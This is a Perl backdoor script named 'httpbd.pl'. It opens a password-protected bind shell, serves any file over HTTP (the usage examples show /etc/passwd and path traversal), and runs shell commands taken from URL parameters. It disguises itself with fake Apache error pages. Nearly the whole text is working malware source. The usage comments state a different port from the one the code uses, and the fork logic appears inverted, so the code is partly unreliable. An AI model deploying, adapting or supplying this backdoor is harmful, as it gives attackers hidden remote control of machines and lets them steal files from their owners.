#!/usr/bin/perl

# httpbd.pl Usage:
#   1. bind shell:
#    nc target 25552
#    ->SHELLPASSWORD{ENTER}{ENTER}
#   2. download files
#     http://target:25552/file?/etc/passwd
#    or
#    http://target:25552/file?../some/file
#   3. http shell
#    http://target:25552/shell?id;uname -a
# Author: [ rav3n nomail@host.com ]

use Socket;

$SHELL="/bin/sh -i";
$SHELLPASSWORD="antic5";
$LISTENPORT="10001";
$HTTPFILECMD="file";
$HTTPSHELLCMD="shell";

$HTTP404=   "HTTP/1.1 404 Not Found\n" .
    "Date: Mon, 14 Jan 2002 03:19:55 GMT\n" .
    "Server: Apache/1.3.22 (Unix)\n" .
    "Connection: close\n" .
    "Content-Type: text/html\n\n" .
    "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 4.0//EN\">\n" .
    "<HTML><HEAD>\n" .
    "<TITLE>404 Not Found</TITLE>\n" .
    "</HEAD><BODY>\n" .
    "<H1>Not Found</H1>\n" .
    "The requested URL was not found on this server.<P>\n" .
    "<HR>\n" .
    "<ADDRESS>Apache/1.3.22 Server at localhost Port $LISTENPORT</ADDRESS>\n" .
    "</BODY></HTML>\n";

$HTTP400=  "HTTP/1.1 400 Bad Request\n" .
    "Server: Apache/1.3.22 (Unix)\n" .
    "Date: Mon, 14 Jan 2002 03:19:55 GMT\n" .
    "Cache-Control: no-cache,no-store\n" .
    "Connection: close\n" .
    "Content-Type: text/html\n\n" .
    "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 4.0//EN\">\n" .
    "<HTML><HEAD><TITLE>400 Bad Request</TITLE></HEAD>" .
    "<BODY>" .
    "<H1>400 Bad Request</H1>Your request has bad syntax or is inherently impossible to satisfy.</BODY></HTML>\n";

$HTTP200=  "HTTP/1.1 200 OK\n" .
    "Cache-Control: no-cache,no-store\n" .
    "Connection: close\n";

$protocol=getprotobyname('tcp');
socket(S,&PF_INET,&SOCK_STREAM,$protocol) || die "Cant create socket\n";
setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);
bind (S,sockaddr_in($LISTENPORT,INADDR_ANY)) || die "Cant open port\n";
listen (S,3) || die "Cant listen port\n";
while(1)
{
accept (CONN,S);
if(! ($pid=fork))
{
die "Cannot fork" if (! defined $pid);
close CONN;
}
else
{
$buf=<CONN>; chomp($buf); $buf=~s/\r//g;
M1:
while($s= <CONN>) {
if($s=~/^\r?\n$/) { last M1; }
}
  if($buf eq $SHELLPASSWORD)
  {
    open STDIN,"<&CONN";
    open STDOUT,">&CONN";
    open STDERR,">&CONN";
    exec $SHELL || die print CONN "Cant execute $SHELL\n";
  }
  elsif($buf=~/^GET \/$HTTPFILECMD\?([^ ]+) HTTP\/1\.[01]$/)
  {
    $file=$1;
    $file=~s/%([0-9a-f]{2})/chr(hex($1))/ge;
    print CONN $HTTP200;
    print CONN "Content-type: text/plain\n\n";
    open (HTTPFILE,$file) || goto M2;

    while(<HTTPFILE>)
    {
      print CONN $_;
    }
    close HTTPFILE;
  }
  elsif($buf=~/^GET \/$HTTPSHELLCMD\?([^ ]+) HTTP\/1\.[01]$/)
  {
    $shcmd=$1;
    $shcmd=~s/%([0-9a-f]{2})/chr(hex($1))/ge;
    $out=`$shcmd`;
    print CONN $HTTP200;
    print CONN "Content-type: text/html\n\n";
    print CONN "<body bgcolor=black>\n<font color=white>\n";
    print CONN "<pre>".$out."</pre></font></body>\n";
  }
  elsif($buf=~/^GET \/ HTTP\/1\.[01]$/)
  {
    print CONN $HTTP200;
    print CONN "Content-type: text/plain\n\n";
  }
  elsif($buf=~/^GET (\/[^\/]+)+ HTTP\/1\.[01]$/)
  {
    print CONN $HTTP404;

  }
  else
  {
    print CONN $HTTP400;
  }
M2:
close CONN;
exit 0;
}
}